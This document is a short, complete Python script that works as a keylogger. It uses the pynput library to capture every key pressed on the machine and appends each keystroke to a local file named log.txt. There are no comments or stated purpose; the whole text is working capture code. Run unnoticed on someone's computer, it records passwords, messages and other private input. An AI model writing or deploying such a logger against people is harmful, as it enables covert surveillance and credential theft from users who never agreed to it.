from pynput.keyboard import Listener

def pressed(key):
    with open("log.txt", "a") as f:
        f.write(str(key))
        f.close()

if __name__=="__main__":
    with Listener(on_press=pressed) as listener:
        listener.join()
